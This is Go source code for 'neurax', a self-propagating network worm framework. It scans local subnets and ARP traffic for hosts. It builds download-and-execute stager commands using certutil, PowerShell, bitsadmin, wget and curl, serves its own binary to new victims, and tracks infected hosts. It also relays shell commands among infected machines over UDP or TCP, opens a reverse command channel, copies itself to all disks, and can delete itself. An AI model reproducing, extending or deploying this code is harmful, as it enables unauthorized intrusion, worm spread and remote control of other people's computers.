package neurax

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	coldfire "github.com/redcode-labs/Coldfire"
	"github.com/yelinaung/go-haikunator"
)

var InfectedHosts = []string{}

type __NeuraxConfig struct {
	stager           string
	port             int
	comm_port        int
	comm_proto       string
	local_ip         string
	path             string
	file_name        string
	platform         string
	cidr             string
	scan_passive     bool
	scan_timeout     int
	read_arp_cache   bool
	threads          int
	full_range       bool
	base64           bool
	required_port    int
	verbose          bool
	remove           bool
	scan_interval    string
	reverse_listener string
}

var NeuraxConfig = __NeuraxConfig{
	stager:           "random",
	port:             6741, //coldfire.RandomInt(2222, 9999),
	comm_port:        7777,
	comm_proto:       "udp",
	required_port:    0,
	local_ip:         coldfire.GetLocalIp(),
	path:             "random",
	file_name:        "random",
	platform:         runtime.GOOS,
	cidr:             coldfire.GetLocalIp() + "/24",
	scan_passive:     false,
	scan_timeout:     2,
	read_arp_cache:   false,
	threads:          10,
	full_range:       false,
	base64:           false,
	verbose:          false,
	remove:           false,
	scan_interval:    "2m",
	reverse_listener: "none",
}

func ReportError(message string, e error) {
	if e != nil && NeuraxConfig.verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if NeuraxConfig.remove {
			os.Remove(os.Args[0])
		}
	}
}

func NeuraxStager() string {
	stagers := [][]string{}
	stager := []string{}
	paths := []string{}
	b64_decoder := ""
	windows_stagers := [][]string{
		[]string{"certutil", `certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
		[]string{"powershell", `Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
		[]string{"bitsadmin", `bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
	}
	linux_stagers := [][]string{
		[]string{"wget", `wget -O SAVE_PATH/FILENAME URL; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
		[]string{"curl", `curl URL/FILENAME > SAVE_PATH/FILENAME; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
	}
	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
		"/etc/", "/usr/", "/usr/share/"}
	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
	switch NeuraxConfig.platform {
	case "windows":
		stagers = windows_stagers
		paths = windows_save_paths
		if NeuraxConfig.base64 {
			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
	case "linux", "darwin":
		stagers = linux_stagers
		paths = linux_save_paths
		if NeuraxConfig.base64 {
			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
	}
	if NeuraxConfig.stager == "random" {
		stager = coldfire.RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == NeuraxConfig.stager {
				stager = st
			}
		}
	}
	selected_stager_command := stager[1]
	if NeuraxConfig.path == "random" {
		NeuraxConfig.path = coldfire.RandomSelectStr(paths)
	}
	if NeuraxConfig.file_name == "random" && NeuraxConfig.platform == "windows" {
		NeuraxConfig.file_name += ".exe"
	}
	url := fmt.Sprintf("http://%s:%d/%s", NeuraxConfig.local_ip, NeuraxConfig.port, NeuraxConfig.file_name)
	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", NeuraxConfig.file_name, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.path, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
	return selected_stager_command
}

func NeuraxServer() {
	/*if NeuraxConfig.prevent_reinfect {
		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
	}*/
	data, _ := ioutil.ReadFile(os.Args[0])
	if NeuraxConfig.base64 {
		data = []byte(coldfire.B64E(string(data)))
	}
	addr := fmt.Sprintf(":%d", NeuraxConfig.port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		http.ServeContent(rw, r, NeuraxConfig.file_name, time.Now(), bytes.NewReader(data))
	}))
}

func IsHostActive(target string) bool {
	first := 19
	last := 300
	if NeuraxConfig.full_range {
		last = 65535
	}
	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.scan_timeout)*time.Second, NeuraxConfig.threads)
	opened_ports := ps.GetOpenedPort(first, last)
	if len(opened_ports) != 0 {
		if NeuraxConfig.required_port == 0 {
			return true
		} else {
			if coldfire.PortscanSingle(target, NeuraxConfig.required_port) {
				return true
			}
		}
	}
	return false
}

func IsHostInfected(target string) bool {
	if coldfire.Contains(InfectedHosts, target) {
		return true
	}
	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.port)
	rsp, err := http.Get(target_url)
	if err != nil {
		return false
	}
	if rsp.StatusCode == 200 {
		InfectedHosts = append(InfectedHosts, target)
		InfectedHosts = coldfire.RemoveFromSlice(InfectedHosts, coldfire.GetLocalIp())
		return true
	}
	return false
}

/*func handle_revshell_conn() {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func NeuraxSignal(addr string) {
	conn, err := net.Dial("udp", addr)
	ReportError("Cannot establish reverse UDP conn", err)
	for {
		handle_revshell_conn(conn)
	}
}*/

func handle_command(cmd string) {
	DataSender := coldfire.SendDataUDP
	forwarded_preamble := ""
	if NeuraxConfig.comm_proto == "tcp" {
		DataSender = coldfire.SendDataTCP
	}
	preamble := strings.Fields(cmd)[0]
	if strings.Contains(preamble, "k") {
		forwarded_preamble = preamble
	}
	if strings.Contains(preamble, ":") {
		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
		if strings.Contains(preamble, "s") {
			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
		}
		if strings.Contains(preamble, "x") {
			coldfire.CmdOut(cmd)
		}
		if strings.Contains(preamble, "a") {
			for _, host := range InfectedHosts {
				err := DataSender(host, NeuraxConfig.comm_port, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
				ReportError("Cannot send command", err)
			}
		}
		if strings.Contains(preamble, "r") {
			coldfire.Remove()
			os.Exit(0)
		}
	} else {
		coldfire.CmdOut(cmd)
	}

}

func NeuraxOpenComm() {
	l, err := net.Listen(NeuraxConfig.comm_proto, "0.0.0.0:"+strconv.Itoa(NeuraxConfig.comm_port))
	ReportError("Comm listen error", err)
	for {
		conn, err := l.Accept()
		ReportError("Comm accept error", err)
		buff := make([]byte, 1024)
		len, _ := conn.Read(buff)
		cmd := string(buff[:len-1])
		go handle_command(cmd)
		conn.Close()
	}
}

func NeuraxReverse() {
	conn, _ := net.Dial("udp", NeuraxConfig.reverse_listener)
	for {
		command, _ := bufio.NewReader(conn).ReadString('\n')
		command = strings.TrimSuffix(command, "\n")
		go handle_command(command)
	}
}

func neurax_scan_core(c chan string) {
	if NeuraxConfig.scan_passive {
		var snapshot_len int32 = 1024
		var timeout time.Duration = 500000 * time.Second
		devices, err := pcap.FindAllDevs()
		ReportError("Cannot obtain network interfaces", err)
		for _, device := range devices {
			handler, err := pcap.OpenLive(device.Name, snapshot_len, false, timeout)
			ReportError("Cannot open device", err)
			handler.SetBPFFilter("arp")
			defer handler.Close()
			packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
			for packet := range packetSource.Packets() {
				ip_layer := packet.Layer(layers.LayerTypeIPv4)
				if ip_layer != nil {
					ip, _ := ip_layer.(*layers.IPv4)
					source := fmt.Sprintf("%s", ip.SrcIP)
					destination := fmt.Sprintf("%s", ip.DstIP)
					if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
						c <- source
					}
					if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
						c <- destination
					}
				}
			}
		}
	} else {
		targets := []string{}
		if NeuraxConfig.read_arp_cache {
			for ip, _ := range arp.Table() {
				if !IsHostInfected(ip) {
					targets = append(targets, ip)
				}
			}
		}
		full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.cidr)
		for _, addr := range full_addr_range {
			targets = append(targets, addr)
		}
		targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
		for _, target := range targets {
			if IsHostActive(target) && !IsHostInfected(target) {
				c <- target
			}
		}
	}
}

func NeuraxScan(c chan string) {
	for {
		neurax_scan_core(c)
		time.Sleep(time.Duration(coldfire.IntervalToSeconds(NeuraxConfig.scan_interval)))
	}
}

func NeuraxDisks() error {
	haikunator := haikunator.New(time.Now().UTC().UnixNano())
	selected_name := haikunator.Haikunate()
	if runtime.GOOS == "windows" {
		selected_name += ".exe"
	}
	disks, err := coldfire.Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := coldfire.CopyFile(os.Args[0], d+"/"+selected_name)
		if err != nil {
			return err
		}
	}
	return nil
}
